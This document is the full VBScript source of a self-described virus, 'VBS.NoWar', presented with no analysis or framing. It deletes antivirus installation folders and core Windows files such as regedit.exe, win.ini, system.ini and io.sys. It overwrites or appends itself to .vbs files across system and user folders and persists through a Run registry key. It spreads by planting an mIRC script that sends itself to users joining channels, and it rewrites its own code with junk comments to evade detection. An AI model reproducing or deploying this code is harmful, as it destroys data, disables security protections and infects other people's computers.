REM VBS.NoWar created by Dr Virus Quest
REM Copyright@2003
On Error Resume Next
Set F = CreateObject("Scripting.FileSystemObject")
Set W = CreateObject("Wscript.Shell")
Set OpenSelf = F.OpenTextFile(Wscript.ScriptFullName, 1)
Self = OpenSelf.Readall
Set Wfolder = F.GetSpecialFolder(0)
If F.FolderExists("C:\Program files\Norton AntiVirus") then
  F.FolderDelete("C:\Program files\Norton AntiVirus")
End If
If F.FolderExists("C:\Program files\AVP") then
  F.FolderDelete("C:\Program files\AVP")
End If
If F.FolderExists("C:\Program files\SYMANTEC") then
  F.FolderDelete("C:\Program files\SYMANTEC")
End If
For each F1 in Wfolder.Files
 ExtName = F.GetExtensionName(F1.path)
 If (ExtName="vbs") then
   Set OF = F.OpenTextFile(F1.path, 2, True)
   OF.WriteLine Self
   OF.Close
 End If
Next
Folder1 = W.SpecialFolders("AllUsersDesktop")
For Each Files1 in Folder1
 ExtName1 = F.GetExtensionName(Files1.path)
 If (ExtName1 = "vbs") then
   Set OF1 = F.OpenTextFile(Files1.path, 2, True)
   OF1.WriteLine Self
   OF1.Close
 End If
Next
Folder2 = W.SpecialFolders("AllUsersStartMenu")
For Each Files2 in Folder2
 ExtName2 = F.GetExtensionName(Files2.path)
 If (ExtName2 = "vbs") then
   Set OF2 = F.OpenTextFile(Files2.path, 2, True)
   OF2.WriteLine Self
   OF2.Close
 End If
Next
Folder3 = W.SpecialFolders("AllUsersPrograms")
For Each Files3 in Folder3
 ExtName3 = F.GetExtensionName(Files3.path)
 If (ExtName3 = "vbs") then
   Set OF3 = F.OpenTextFile(Files2.path, 3, True)
   OF3.WriteLine Self
   OF3.Close
 End If
Next
Folder4 = W.SpecialFolders("AllUsersStartup")
For Each Files4 in Folder4
 ExtName4 = F.GetExtensionName(Files4.path)
 If (ExtName4 = "vbs") then
   Set OF4 = F.OpenTextFile(Files4.path, 3, True)
   OF4.WriteLine Self
   OF4.Close
 End If
Next
Folder5 = W.SpecialFolders("MyDocuments")
For Each Files5 in Folder5
 ExtName5 = F.GetExtensionName(Files5.path)
 If (ExtName5 = "vbs") then
   Set OF5 = F.OpenTextFile(Files5.path, 3, True)
   OF5.WriteLine Self
   OF5.Close
 End If
Next
Set Sysfolder = F.GetSpecialFolder(1)
F.CopyFile Wscript.ScriptFullName, Sysfolder & "\NoWar.vbs"
W.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Startup", Sysfolder & "\NoWar.vbs"
Set Regedit = F.GetFile(Wfolder & "\regedit.exe")
Regedit.Delete
Kill "c:\windows\system.ini"
Kill "c:\windows\win.ini"
Kill "c:\io.sys"
If F.FileExists("C:\Mirc\Mirc.ini") then
  Set Mirc = F.OpenTextFile("C:\Mirc\Mirc.ini", 8, True)
  Mirc.WriteLine "[rfiles]"
  Mirc.WriteLine "n100=Script.ini"
  Mirc.Close

  Set Script = F.CreateTextFile("C:\Mirc\Script.ini", True)
  Script.WriteLine "[Script]"
  Script.WriteLine ";Virus: VBS.NoWar"
  Script.WriteLine ";Creator: Dr Virus Quest"
  Script.WriteLine ";"
  Script.WriteLine "n0;"
  Script.WriteLine "n1=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
  Script.WriteLine "n2=  /dcc send $nick c:\mirc\NoWar.vbs"
  Script.WriteLine "n3=}"
  Script.Close 
End If
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(WScript.ScriptFullName, 1)
AllCode = f.Readall
FOR o = 1 TO LEN(AllCode)
IF Mid(AllCode, o, 1) = vbCr THEN x = x + 1
NEXT
Set f = fso.OpenTextFile(WScript.ScriptFullName, 1)
FOR i = 1 TO (x + 1)
Line = f.Readline
For j = 1 To Int(Rnd * 30): Junk = Junk & Chr(255 - Int(Rnd * 60)): Next
Poly = Poly & Line & Chr(39) & Junk & vbCr
If Int(Rnd * 3) = 2 Then Poly = Poly & Chr(39) & Junk & vbCr
Junk = ""
IF Line = "" THEN EXIT FOR
Line = ""
NEXT
Set f = fso.OpenTextFile(WScript.ScriptFullName, 2, True)
f.Writeline Poly